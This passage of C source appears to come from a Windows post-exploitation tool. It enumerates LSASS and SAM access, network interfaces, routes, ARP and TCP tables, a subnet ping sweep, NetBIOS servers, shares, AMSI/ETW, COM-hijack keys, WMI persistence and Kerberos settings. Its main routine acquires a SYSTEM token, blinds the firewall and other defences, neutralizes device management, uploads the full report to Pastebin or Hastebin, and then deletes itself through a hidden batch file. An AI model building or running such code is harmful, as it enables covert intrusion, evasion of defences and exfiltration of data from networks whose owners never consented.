        if (hLsass) {
            append_to_buffer(data, "LSASS access: SUCCESS (SYSTEM token required)\n");
            CloseHandle(hLsass);
        } else {
            append_to_buffer(data, "LSASS access: FAILED (Error: %lu)\n", GetLastError());
        }
    }
    
    // Try to access protected registry
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SAM", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        append_to_buffer(data, "SAM registry access: SUCCESS\n");
        RegCloseKey(hKey);
    } else {
        append_to_buffer(data, "SAM registry access: FAILED (Error: %lu)\n", GetLastError());
    }
    
    append_to_buffer(data, "========================\n\n");
    return 0;
}

// Network interfaces enumeration
int enumerate_network_interfaces(enum_data_t* data) {
    append_to_buffer(data, "\n=== NETWORK INTERFACES ===\n");
    
    IP_ADAPTER_INFO adapterInfo[16];
    DWORD dwBufLen = sizeof(adapterInfo);
    DWORD dwStatus = GetAdaptersInfo(adapterInfo, &dwBufLen);
    
    if (dwStatus == ERROR_SUCCESS) {
        PIP_ADAPTER_INFO pAdapterInfo = adapterInfo;
        do {
            append_to_buffer(data, "Adapter: %s\n", pAdapterInfo->AdapterName);
            append_to_buffer(data, "  Description: %s\n", pAdapterInfo->Description);
            append_to_buffer(data, "  MAC Address: %02X-%02X-%02X-%02X-%02X-%02X\n",
                pAdapterInfo->Address[0], pAdapterInfo->Address[1], pAdapterInfo->Address[2],
                pAdapterInfo->Address[3], pAdapterInfo->Address[4], pAdapterInfo->Address[5]);
            append_to_buffer(data, "  IP Address: %s\n", pAdapterInfo->IpAddressList.IpAddress.String);
            append_to_buffer(data, "  Subnet Mask: %s\n", pAdapterInfo->IpAddressList.IpMask.String);
            append_to_buffer(data, "  Gateway: %s\n", pAdapterInfo->GatewayList.IpAddress.String);
            append_to_buffer(data, "  DHCP Enabled: %s\n", pAdapterInfo->DhcpEnabled ? "Yes" : "No");
            if (pAdapterInfo->DhcpEnabled) {
                append_to_buffer(data, "  DHCP Server: %s\n", pAdapterInfo->DhcpServer.IpAddress.String);
            }
            append_to_buffer(data, "\n");
            pAdapterInfo = pAdapterInfo->Next;
        } while (pAdapterInfo);
    }
    
    append_to_buffer(data, "==========================\n\n");
    return 0;
}

// Network configuration
int enumerate_network_config(enum_data_t* data) {
    append_to_buffer(data, "\n=== NETWORK CONFIGURATION ===\n");
    
    // Routing table
    PMIB_IPFORWARDTABLE pIpForwardTable = NULL;
    DWORD dwSize = 0;
    DWORD dwRetVal = GetIpForwardTable(pIpForwardTable, &dwSize, TRUE);
    
    if (dwRetVal == ERROR_INSUFFICIENT_BUFFER) {
        pIpForwardTable = (MIB_IPFORWARDTABLE*)malloc(dwSize);
        if (pIpForwardTable) {
            dwRetVal = GetIpForwardTable(pIpForwardTable, &dwSize, TRUE);
            if (dwRetVal == NO_ERROR) {
                append_to_buffer(data, "Routing Table Entries: %lu\n", pIpForwardTable->dwNumEntries);
                for (DWORD i = 0; i < pIpForwardTable->dwNumEntries && i < 20; i++) {
                    struct in_addr dest, mask, gateway;
                    dest.S_un.S_addr = pIpForwardTable->table[i].dwForwardDest;
                    mask.S_un.S_addr = pIpForwardTable->table[i].dwForwardMask;
                    gateway.S_un.S_addr = pIpForwardTable->table[i].dwForwardNextHop;
                    append_to_buffer(data, "  Route: %s/%s -> %s\n",
                        inet_ntoa(dest), inet_ntoa(mask), inet_ntoa(gateway));
                }
            }
            free(pIpForwardTable);
        }
    }
    
    // ARP table
    PMIB_IPNETTABLE pArpTable = NULL;
    dwSize = 0;
    dwRetVal = GetIpNetTable(pArpTable, &dwSize, TRUE);
    
    if (dwRetVal == ERROR_INSUFFICIENT_BUFFER) {
        pArpTable = (MIB_IPNETTABLE*)malloc(dwSize);
        if (pArpTable) {
            dwRetVal = GetIpNetTable(pArpTable, &dwSize, TRUE);
            if (dwRetVal == NO_ERROR) {
                append_to_buffer(data, "ARP Table Entries: %lu\n", pArpTable->dwNumEntries);
                for (DWORD i = 0; i < pArpTable->dwNumEntries && i < 20; i++) {
                    struct in_addr ip;
                    ip.S_un.S_addr = pArpTable->table[i].dwAddr;
                    append_to_buffer(data, "  %s -> %02X-%02X-%02X-%02X-%02X-%02X\n",
                        inet_ntoa(ip),
                        pArpTable->table[i].bPhysAddr[0], pArpTable->table[i].bPhysAddr[1],
                        pArpTable->table[i].bPhysAddr[2], pArpTable->table[i].bPhysAddr[3],
                        pArpTable->table[i].bPhysAddr[4], pArpTable->table[i].bPhysAddr[5]);
                }
            }
            free(pArpTable);
        }
    }
    
    append_to_buffer(data, "=============================\n\n");
    return 0;
}

// Active connections
int enumerate_connections(enum_data_t* data) {
    append_to_buffer(data, "\n=== ACTIVE CONNECTIONS ===\n");
    
    PMIB_TCPTABLE_OWNER_PID pTcpTable = NULL;
    DWORD dwSize = 0;
    DWORD dwRetVal = GetExtendedTcpTable(pTcpTable, &dwSize, TRUE, AF_INET, TCP_TABLE_OWNER_PID_ALL, 0);
    
    if (dwRetVal == ERROR_INSUFFICIENT_BUFFER) {
        pTcpTable = (MIB_TCPTABLE_OWNER_PID*)malloc(dwSize);
        if (pTcpTable) {
            dwRetVal = GetExtendedTcpTable(pTcpTable, &dwSize, TRUE, AF_INET, TCP_TABLE_OWNER_PID_ALL, 0);
            if (dwRetVal == NO_ERROR) {
                append_to_buffer(data, "TCP Connections: %lu\n", pTcpTable->dwNumEntries);
                for (DWORD i = 0; i < pTcpTable->dwNumEntries && i < 50; i++) {
                    struct in_addr localAddr, remoteAddr;
                    localAddr.S_un.S_addr = pTcpTable->table[i].dwLocalAddr;
                    remoteAddr.S_un.S_addr = pTcpTable->table[i].dwRemoteAddr;
                    append_to_buffer(data, "  %s:%d -> %s:%d (PID: %lu, State: %lu)\n",
                        inet_ntoa(localAddr), ntohs((u_short)pTcpTable->table[i].dwLocalPort),
                        inet_ntoa(remoteAddr), ntohs((u_short)pTcpTable->table[i].dwRemotePort),
                        pTcpTable->table[i].dwOwningPid, pTcpTable->table[i].dwState);
                }
            }
            free(pTcpTable);
        }
    }
    
    append_to_buffer(data, "===========================\n\n");
    return 0;
}

// Network discovery - comprehensive subnet scanning
int enumerate_network_discovery(enum_data_t* data) {
    append_to_buffer(data, "\n=== NETWORK DISCOVERY ===\n");
    
    // Get local subnet
    IP_ADAPTER_INFO adapterInfo[16];
    DWORD dwBufLen = sizeof(adapterInfo);
    if (GetAdaptersInfo(adapterInfo, &dwBufLen) == ERROR_SUCCESS) {
        PIP_ADAPTER_INFO pAdapter = adapterInfo;
        do {
            if (pAdapter && strlen(pAdapter->IpAddressList.IpAddress.String) > 0) {
                append_to_buffer(data, "Scanning subnet: %s/%s\n", pAdapter->IpAddressList.IpAddress.String, pAdapter->IpAddressList.IpMask.String);
                
                // Parse IP and subnet mask
                struct in_addr ipAddr, subnetMask;
                inet_pton(AF_INET, pAdapter->IpAddressList.IpAddress.String, &ipAddr);
                inet_pton(AF_INET, pAdapter->IpAddressList.IpMask.String, &subnetMask);
                
                // Calculate network address
                struct in_addr networkAddr;
                networkAddr.S_un.S_addr = ipAddr.S_un.S_addr & subnetMask.S_un.S_addr;
                
                // Calculate broadcast address
                struct in_addr broadcastAddr;
                broadcastAddr.S_un.S_addr = networkAddr.S_un.S_addr | ~subnetMask.S_un.S_addr;
                
                // Count hosts in subnet
                unsigned long network = ntohl(networkAddr.S_un.S_addr);
                unsigned long broadcast = ntohl(broadcastAddr.S_un.S_addr);
                unsigned long hostCount = broadcast - network - 1;
                
                append_to_buffer(data, "Network range: %s to %s (%lu hosts)\n", 
                    inet_ntoa(networkAddr), inet_ntoa(broadcastAddr), hostCount);
                
                // Ping sweep using IcmpSendEcho (limited to first 50 hosts for performance)
                HANDLE hIcmpFile = IcmpCreateFile();
                if (hIcmpFile != INVALID_HANDLE_VALUE) {
                    int hostsFound = 0;
                    char sendData[32] = "ICMP Echo Request";
                    char replyBuffer[sizeof(ICMP_ECHO_REPLY) + 32];
                    
                    for (unsigned long i = 1; i <= (hostCount < 50 ? hostCount : 50); i++) {
                        struct in_addr targetIP;
                        targetIP.S_un.S_addr = htonl(network + i);
                        
                        DWORD dwRetVal = IcmpSendEcho(hIcmpFile, targetIP.S_un.S_addr, sendData, sizeof(sendData), NULL, replyBuffer, sizeof(replyBuffer), 1000);
                        if (dwRetVal != 0) {
                            PICMP_ECHO_REPLY pEchoReply = (PICMP_ECHO_REPLY)replyBuffer;
                            if (pEchoReply->Status == IP_SUCCESS) {
                                char ipStr[16];
                                strcpy(ipStr, inet_ntoa(targetIP));
                                append_to_buffer(data, "  Host %s is UP (RTT: %lu ms)\n", ipStr, pEchoReply->RoundTripTime);
                                hostsFound++;
                            }
                        }
                    }
                    append_to_buffer(data, "  Found %d active hosts\n", hostsFound);
                    IcmpCloseHandle(hIcmpFile);
                }
                
                break;  // Scan first adapter only
            }
            pAdapter = pAdapter->Next;
        } while (pAdapter);
    }
    
    // NetBIOS enumeration using NetServerEnum
    append_to_buffer(data, "NetBIOS Enumeration:\n");
    SERVER_INFO_100* pServerInfo = NULL;
    DWORD dwEntriesRead = 0;
    DWORD dwTotalEntries = 0;
    NET_API_STATUS nStatus = NetServerEnum(NULL, 100, (LPBYTE*)&pServerInfo, MAX_PREFERRED_LENGTH, &dwEntriesRead, &dwTotalEntries, SV_TYPE_ALL, NULL, NULL);
    
    if (nStatus == NERR_Success || nStatus == ERROR_MORE_DATA) {
        if (pServerInfo != NULL) {
            for (DWORD i = 0; i < dwEntriesRead; i++) {
                if (pServerInfo[i].sv100_name != NULL) {
                    char serverName[256];
                    WideCharToMultiByte(CP_UTF8, 0, pServerInfo[i].sv100_name, -1, serverName, sizeof(serverName), NULL, NULL);
                    append_to_buffer(data, "  Server: %s\n", serverName);
                }
            }
            append_to_buffer(data, "Total Servers: %lu\n", dwTotalEntries);
        }
        if (pServerInfo != NULL) {
            NetApiBufferFree(pServerInfo);
        }
    } else {
        append_to_buffer(data, "NetServerEnum failed: %lu\n", nStatus);
    }
    
    // Network shares enumeration
    append_to_buffer(data, "Network Shares:\n");
    NETRESOURCEA* pNetResource = NULL;
    HANDLE hEnum;
    DWORD dwResult = WNetOpenEnumA(RESOURCE_CONNECTED, RESOURCETYPE_DISK, 0, NULL, &hEnum);
    if (dwResult == NO_ERROR) {
        DWORD dwBufferSize = 16384;
        pNetResource = (NETRESOURCEA*)malloc(dwBufferSize);
        if (pNetResource) {
            DWORD dwEntries = 1;
            while (WNetEnumResourceA(hEnum, &dwEntries, pNetResource, &dwBufferSize) == NO_ERROR) {
                for (DWORD i = 0; i < dwEntries; i++) {
                    append_to_buffer(data, "  Share: %s (%s)\n", 
                        pNetResource[i].lpRemoteName ? pNetResource[i].lpRemoteName : "Unknown",
                        pNetResource[i].lpProvider ? pNetResource[i].lpProvider : "Unknown");
                }
                dwEntries = 1;
            }
        }
        WNetCloseEnum(hEnum);
        if (pNetResource) free(pNetResource);
    }
    
    append_to_buffer(data, "========================\n\n");
    return 0;
}

// Wireless networks
int enumerate_wireless(enum_data_t* data) {
    append_to_buffer(data, "\n=== WIRELESS NETWORKS ===\n");
    append_to_buffer(data, "Note: Wireless enumeration requires WLAN API\n");
    append_to_buffer(data, "==========================\n\n");
    return 0;
}

// VLAN structure enumeration using WMI and network adapters
int enumerate_vlan_structure(enum_data_t* data) {
    append_to_buffer(data, "\n=== VLAN STRUCTURE ===\n");
    
    // Enumerate VLAN adapters via network adapters
    IP_ADAPTER_INFO adapterInfo[16];
    DWORD dwBufLen = sizeof(adapterInfo);
    if (GetAdaptersInfo(adapterInfo, &dwBufLen) == ERROR_SUCCESS) {
        PIP_ADAPTER_INFO pAdapter = adapterInfo;
        do {
            // Check if adapter name or description contains VLAN
            char descUpper[256];
            strncpy(descUpper, pAdapter->Description, sizeof(descUpper) - 1);
            descUpper[sizeof(descUpper) - 1] = '\0';
            for (int i = 0; descUpper[i]; i++) {
                descUpper[i] = toupper(descUpper[i]);
            }
            
            if (strstr(descUpper, "VLAN") || strstr(pAdapter->AdapterName, "VLAN")) {
                append_to_buffer(data, "VLAN Adapter: %s\n", pAdapter->Description);
                append_to_buffer(data, "  Adapter Name: %s\n", pAdapter->AdapterName);
                append_to_buffer(data, "  IP Address: %s\n", pAdapter->IpAddressList.IpAddress.String);
                append_to_buffer(data, "  Subnet Mask: %s\n", pAdapter->IpAddressList.IpMask.String);
                append_to_buffer(data, "  MAC Address: %02X-%02X-%02X-%02X-%02X-%02X\n",
                    pAdapter->Address[0], pAdapter->Address[1], pAdapter->Address[2],
                    pAdapter->Address[3], pAdapter->Address[4], pAdapter->Address[5]);
            }
            pAdapter = pAdapter->Next;
        } while (pAdapter);
    }
    
    // VLAN enumeration via WMI
    HRESULT hres;
    IWbemLocator* pLoc = NULL;
    IWbemServices* pSvc = NULL;
    
    hres = CoInitializeEx(0, COINIT_MULTITHREADED);
    if (SUCCEEDED(hres)) {
        hres = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_NONE, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE, NULL);
        if (SUCCEEDED(hres)) {
            hres = CoCreateInstance(&CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, &IID_IWbemLocator, (LPVOID*)&pLoc);
            if (SUCCEEDED(hres)) {
                hres = pLoc->lpVtbl->ConnectServer(pLoc, L"ROOT\\CIMV2", NULL, NULL, 0, NULL, 0, 0, &pSvc);
                if (SUCCEEDED(hres)) {
                    hres = CoSetProxyBlanket((IUnknown*)pSvc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL, RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE);
                    if (SUCCEEDED(hres)) {
                        // Query network adapters for VLAN information
                        IEnumWbemClassObject* pEnumerator = NULL;
                        hres = pSvc->lpVtbl->ExecQuery(pSvc, L"WQL", L"SELECT Name, Description, MACAddress, NetConnectionID FROM Win32_NetworkAdapter WHERE NetConnectionID IS NOT NULL", WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, NULL, &pEnumerator);
                        if (SUCCEEDED(hres)) {
                            IWbemClassObject* pclsObj = NULL;
                            ULONG uReturn = 0;
                            while (pEnumerator->lpVtbl->Next(pEnumerator, WBEM_INFINITE, 1, &pclsObj, &uReturn) == WBEM_S_NO_ERROR) {
                                VARIANT vtProp;
                                VariantInit(&vtProp);
                                
                                char adapterName[512] = {0};
                                char adapterDesc[512] = {0};
                                
                                if (pclsObj->lpVtbl->Get(pclsObj, L"NetConnectionID", 0, &vtProp, 0, 0) == WBEM_S_NO_ERROR) {
                                    if (vtProp.vt == VT_BSTR) {
                                        WideCharToMultiByte(CP_UTF8, 0, vtProp.bstrVal, -1, adapterName, sizeof(adapterName), NULL, NULL);
                                        VariantClear(&vtProp);
                                        
                                        // Check if it's a VLAN adapter
                                        char nameUpper[512];
                                        strncpy(nameUpper, adapterName, sizeof(nameUpper) - 1);
                                        for (int i = 0; nameUpper[i]; i++) {
                                            nameUpper[i] = toupper(nameUpper[i]);
                                        }
                                        
                                        if (strstr(nameUpper, "VLAN")) {
                                            append_to_buffer(data, "WMI VLAN Adapter: %s\n", adapterName);
                                            
                                            if (pclsObj->lpVtbl->Get(pclsObj, L"Description", 0, &vtProp, 0, 0) == WBEM_S_NO_ERROR) {
                                                if (vtProp.vt == VT_BSTR) {
                                                    WideCharToMultiByte(CP_UTF8, 0, vtProp.bstrVal, -1, adapterDesc, sizeof(adapterDesc), NULL, NULL);
                                                    append_to_buffer(data, "  Description: %s\n", adapterDesc);
                                                }
                                                VariantClear(&vtProp);
                                            }
                                            
                                            if (pclsObj->lpVtbl->Get(pclsObj, L"MACAddress", 0, &vtProp, 0, 0) == WBEM_S_NO_ERROR) {
                                                if (vtProp.vt == VT_BSTR) {
                                                    char mac[64];
                                                    WideCharToMultiByte(CP_UTF8, 0, vtProp.bstrVal, -1, mac, sizeof(mac), NULL, NULL);
                                                    append_to_buffer(data, "  MAC Address: %s\n", mac);
                                                }
                                                VariantClear(&vtProp);
                                            }
                                        }
                                    }
                                }
                                
                                pclsObj->lpVtbl->Release(pclsObj);
                            }
                            pEnumerator->lpVtbl->Release(pEnumerator);
                        }
                        
                        pSvc->lpVtbl->Release(pSvc);
                    }
                }
                pLoc->lpVtbl->Release(pLoc);
            }
        }
        CoUninitialize();
    }
    
    append_to_buffer(data, "=====================\n\n");
    return 0;
}

// Self-deletion function
void self_delete(void) {
    char modulePath[MAX_PATH];
    char batchPath[MAX_PATH];
    char batchContent[1024];
    
    // Get current executable path
    if (GetModuleFileNameA(NULL, modulePath, MAX_PATH) == 0) {
        return;
    }
    
    // Create batch file path
    snprintf(batchPath, sizeof(batchPath), "%s_delete.bat", modulePath);
    
    // Create batch file content
    snprintf(batchContent, sizeof(batchContent),
        "@echo off\n"
        "timeout /t 2 /nobreak >nul\n"
        "del \"%s\"\n"
        "del \"%%~f0\"\n",
        modulePath);
    
    // Write batch file
    FILE* f = fopen(batchPath, "w");
    if (f) {
        fwrite(batchContent, 1, strlen(batchContent), f);
        fclose(f);
        
        // Execute batch file
        STARTUPINFOA si = {0};
        PROCESS_INFORMATION pi = {0};
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;
        
        char cmdLine[1024];
        snprintf(cmdLine, sizeof(cmdLine), "cmd.exe /c \"%s\"", batchPath);
        
        if (CreateProcessA(NULL, cmdLine, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }
    }
}

// Main function
int main(int argc, char* argv[]) {
    enum_data_t data;
    progress_bar_t progress;
    upload_result_t uploadResult;
    
    // Initialize Winsock
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        printf("WSAStartup failed\n");
        return 1;
    }
    
    // Initialize
    init_enum_data(&data);
    init_progress_bar(&progress);
    
    // Header
    append_to_buffer(&data, "=== WINDOWS SYSTEM ENUMERATION REPORT ===\n");
    time_t now = time(NULL);
    char* timeStr = ctime(&now);
    if (timeStr) {
        // Remove newline
        size_t len = strlen(timeStr);
        if (len > 0 && timeStr[len-1] == '\n') {
            timeStr[len-1] = '\0';
        }
        append_to_buffer(&data, "Generated: %s\n", timeStr);
    }
    
    // STEP 1: SYSTEM Token Acquisition via PE5 (first priority)
    update_progress(&progress, 0, "Acquiring SYSTEM Token via PE5");
    if (acquire_system_token(&data.token_result)) {
        data.has_system_token = true;
        update_progress(&progress, 2, "SYSTEM Token Acquired");
        log_token_result(&data, &data.token_result);
        
        // STEP 2: Blind firewall and all defensive features immediately after SYSTEM token
        update_progress(&progress, 3, "Blinding Firewall and Defensive Features");
        blind_defensive_features(&data);
        
        // STEP 3: Detect and neutralize MDM after defensive blinding
        update_progress(&progress, 5, "Detecting and Neutralizing MDM");
        detect_and_neutralize_mdm(&data);
    } else {
        data.has_system_token = false;
        update_progress(&progress, 2, "SYSTEM Token Acquisition Failed");
        log_token_result(&data, &data.token_result);
        append_to_buffer(&data, "\n[!] WARNING: SYSTEM token acquisition failed. Defensive feature blinding and MDM neutralization will be skipped.\n");
        append_to_buffer(&data, "[!] Enumeration will continue with limited privileges.\n\n");
    }
    
    // System Enumeration
    enumerate_system(&data, update_progress);
    
    // Network Enumeration
    enumerate_network(&data, update_progress);
    
    // Recursive Network Discovery (W-SLAM techniques)
    update_progress(&progress, 70, "Recursive Network Discovery");
    enumerate_network_recursive(&data, 3);  // Max depth 3
    
    // VLAN Enumeration
    enumerate_vlan(&data, update_progress);
    
    // Phase 1: Enhanced Enumeration Data Collection
    update_progress(&progress, 75, "Post-Exploitation Indicators");
    enumerate_post_exploitation_indicators(&data);
    
    update_progress(&progress, 77, "Active Directory & Certificate Services");
    enumerate_ad_infrastructure(&data);
    enumerate_certificate_services(&data);
    check_certificate_template_vulnerabilities(&data);
    detect_adcs_misconfigurations(&data);
    
    update_progress(&progress, 80, "WAF/Web Application Detection");
    detect_waf_presence(&data);
    enumerate_web_application_tech(&data);
    check_normalization_bypass_opportunities(&data);
    
    update_progress(&progress, 82, "C2 Infrastructure Opportunities");
    enumerate_c2_opportunities(&data);
    
    update_progress(&progress, 84, "Steganography Opportunities");
    enumerate_steganography_opportunities(&data);
    
    // Upload to Pastebin (with fallback)
    update_progress(&progress, 90, "Uploading to Pastebin");
    uploadResult = upload_to_pastebin(data.buffer, (size_t)data.buffer_used, "ducknipples");
    
    // Try fallback services if Pastebin fails
    if (!uploadResult.success) {
        update_progress(&progress, 92, "Trying Hastebin (fallback)");
        uploadResult = upload_to_hastebin(data.buffer, data.buffer_used);
    }
    
    if (uploadResult.success) {
        update_progress(&progress, 100, "Upload Complete");
        finish_progress_bar(&progress);
        
        printf("\n[SUCCESS] Enumeration data uploaded!\n");
        printf("URL: %s\n", uploadResult.url);
        if (uploadResult.service_used == PASTE_PASTEBIN) {
            printf("Password: ducknipples\n");
        }
        printf("\nPress OK to delete this program...\n");
        
        // Self-delete
        MessageBoxA(NULL, "Enumeration complete! Program will now delete itself.", "Enumerator", MB_OK | MB_ICONINFORMATION);
        self_delete();
    } else {
        printf("\n[ERROR] Failed to upload enumeration data: %s\n", uploadResult.error_message);
        printf("Service used: %d\n", uploadResult.service_used);
        return 1;
    }
    
    // Cleanup
    free_enum_data(&data);
    cleanup_progress_bar(&progress);
    WSACleanup();
    
    return 0;
}

// ============================================================================
// Phase 1: Enhanced Enumeration Data Collection
// ============================================================================

// 1.1 Post-Exploitation Indicators (WINCLOAK patterns)

int enumerate_post_exploitation_indicators(enum_data_t* data) {
    append_to_buffer(data, "\n=== POST-EXPLOITATION INDICATORS (WINCLOAK PATTERNS) ===\n");
    
    detect_amsi_etw_wfp(data);
    enumerate_com_hijacking_opportunities(data);
    check_wmi_persistence(data);
    enumerate_kerberos_opportunities(data);
    detect_rootkit_indicators(data);
    
    return 0;
}

int detect_amsi_etw_wfp(enum_data_t* data) {
    append_to_buffer(data, "\n--- AMSI/ETW/WFP Detection ---\n");
    
    // Check for AMSI.dll in loaded modules
    HMODULE hAmsi = LoadLibraryA("amsi.dll");
    if (hAmsi != NULL) {
        append_to_buffer(data, "[+] AMSI.dll is available (AMSI protection active)\n");
        FreeLibrary(hAmsi);
    } else {
        append_to_buffer(data, "[-] AMSI.dll not found (AMSI protection may be disabled)\n");
    }
    
    // Check for ETW providers via registry
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        append_to_buffer(data, "[+] ETW Autologger registry key accessible\n");
        RegCloseKey(hKey);
    }
    
    // Check for WFP (Windows Filtering Platform) via registry
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\BFE", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        append_to_buffer(data, "[+] Windows Filtering Platform (BFE) service present\n");
        RegCloseKey(hKey);
    }
    
    // Check for ETW providers in processes
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, GetCurrentProcessId());
    if (hSnapshot != INVALID_HANDLE_VALUE) {
        MODULEENTRY32 me32;
        me32.dwSize = sizeof(MODULEENTRY32);
        if (Module32First(hSnapshot, &me32)) {
            do {
                if (strstr(me32.szModule, "ntdll.dll") != NULL) {
                    append_to_buffer(data, "[+] ETW provider (ntdll.dll) loaded in process\n");
                    break;
                }
            } while (Module32Next(hSnapshot, &me32));
        }
        CloseHandle(hSnapshot);
    }
    
    return 0;
}

int enumerate_com_hijacking_opportunities(enum_data_t* data) {
    append_to_buffer(data, "\n--- COM Hijacking Opportunities ---\n");
    
    // Check common COM hijacking locations in registry
    const char* comKeys[] = {
        "SOFTWARE\\Classes\\CLSID",
        "SOFTWARE\\Wow6432Node\\Classes\\CLSID",
        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\ShellServiceObjectDelayLoad",
        "SOFTWARE\\Microsoft\\Office\\Excel\\Addins",
        "SOFTWARE\\Microsoft\\Office\\Word\\Addins"
    };
    
    for (int i = 0; i < sizeof(comKeys) / sizeof(comKeys[0]); i++) {
        HKEY hKey;
        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, comKeys[i], 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            append_to_buffer(data, "[+] COM registry key accessible: %s\n", comKeys[i]);
            RegCloseKey(hKey);
        }
    }
    
    // Check user-level COM keys
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\Classes\\CLSID", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        append_to_buffer(data, "[+] User-level COM CLSID key accessible\n");
        RegCloseKey(hKey);
    }
    
    return 0;
}

int check_wmi_persistence(enum_data_t* data) {
    append_to_buffer(data, "\n--- WMI Persistence Check ---\n");
    
    // Initialize COM for WMI
    HRESULT hres = CoInitializeEx(0, COINIT_MULTITHREADED);
    if (FAILED(hres)) {
        append_to_buffer(data, "[-] Failed to initialize COM for WMI: 0x%08X\n", hres);
        return -1;
    }
    
    // Initialize security
    hres = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_NONE, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE, NULL);
    
    // Obtain WMI locator
    IWbemLocator* pLoc = NULL;
    hres = CoCreateInstance(&CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, &IID_IWbemLocator, (LPVOID*)&pLoc);
    
    if (SUCCEEDED(hres)) {
        // Connect to WMI
        IWbemServices* pSvc = NULL;
        BSTR strNetworkResource = SysAllocString(L"\\\\\\.\\root\\subscription");
        hres = pLoc->lpVtbl->ConnectServer(pLoc, strNetworkResource, NULL, NULL, NULL, 0, NULL, NULL, &pSvc);
        SysFreeString(strNetworkResource);
        
        if (SUCCEEDED(hres)) {
            append_to_buffer(data, "[+] WMI Event Subscription namespace accessible\n");
            
            // Query for event filters
            IEnumWbemClassObject* pEnumerator = NULL;
            hres = pSvc->lpVtbl->ExecQuery(pSvc, L"WQL", L"SELECT * FROM __EventFilter", WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, NULL, &pEnumerator);
            
            if (SUCCEEDED(hres)) {
                IWbemClassObject* pclsObj = NULL;
                ULONG uReturn = 0;
                int filterCount = 0;
                
                while (pEnumerator->lpVtbl->Next(pEnumerator, WBEM_INFINITE, 1, &pclsObj, &uReturn) == WBEM_S_NO_ERROR) {
                    filterCount++;
                    pclsObj->lpVtbl->Release(pclsObj);
                }
                
                if (filterCount > 0) {
                    append_to_buffer(data, "[+] Found %d WMI event filters (potential persistence)\n", filterCount);
                }
                
                pEnumerator->lpVtbl->Release(pEnumerator);
            }
            
            pSvc->lpVtbl->Release(pSvc);
        }
        
        pLoc->lpVtbl->Release(pLoc);
    }
    
    CoUninitialize();
    return 0;
}

int enumerate_kerberos_opportunities(enum_data_t* data) {
    append_to_buffer(data, "\n--- Kerberos Opportunities ---\n");
    
    // Check for Kerberos ticket cache location
    char ticketPath[MAX_PATH];
    if (GetEnvironmentVariableA("TEMP", ticketPath, MAX_PATH) > 0) {
        append_to_buffer(data, "[+] Kerberos ticket cache location (TEMP): %s\n", ticketPath);
    }
    
    // Check for Kerberos configuration in registry
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\Lsa\\Kerberos", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        append_to_buffer(data, "[+] Kerberos registry configuration accessible\n");
        
        // Check for ticket cache settings
        DWORD cacheSize = 0;
        DWORD cbData = sizeof(DWORD);
        if (RegQueryValueExA(hKey, "MaxTicketAge", NULL, NULL, (LPBYTE)&cacheSize, &cbData) == ERROR_SUCCESS) {
            append_to_buffer(data, "    MaxTicketAge: %lu\n", cacheSize);
        }
        
        RegCloseKey(hKey);
    }
    
    // Check for Kerberos service
    SC_HANDLE hSCManager = OpenSCManagerA(NULL, NULL, SC_MANAGER_CONNECT);
    if (hSCManager != NULL) {
        SC_HANDLE hService = OpenServiceA(hSCManager, "kdc", SERVICE_QUERY_STATUS);
        if (hService != NULL) {
            append_to_buffer(data, "[+] Kerberos Key Distribution Center (KDC) service found\n");
            CloseServiceHandle(hService);
        }
        CloseServiceHandle(hSCManager);
    }
    
    return 0;
}

int detect_rootkit_indicators(enum_data_t* data) {
    append_to_buffer(data, "\n--- Rootkit Indicators ---\n");
    
    // Check for hidden files in system directories
    WIN32_FIND_DATAA findData;
    HANDLE hFind = FindFirstFileA("C:\\Windows\\System32\\*", &findData);
    if (hFind != INVALID_HANDLE_VALUE) {
        int hiddenCount = 0;
        do {
            if (findData.dwFileAttributes & FILE_ATTRIBUTE_HIDDEN) {
                hiddenCount++;
            }
        } while (FindNextFileA(hFind, &findData));
        
        if (hiddenCount > 0) {
            append_to_buffer(data, "[+] Found %d hidden files in System32 (potential rootkit indicator)\n", hiddenCount);
        }
        
        FindClose(hFind);
    }
    
    // Check for processes with suspicious characteristics
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32);
        if (Process32First(hSnapshot, &pe32)) {
            int suspiciousCount = 0;
            do {
                // Check for processes with no parent (potential rootkit)
                if (pe32.th32ParentProcessID == 0 && pe32.th32ProcessID != 0) {
                    suspiciousCount++;
                }
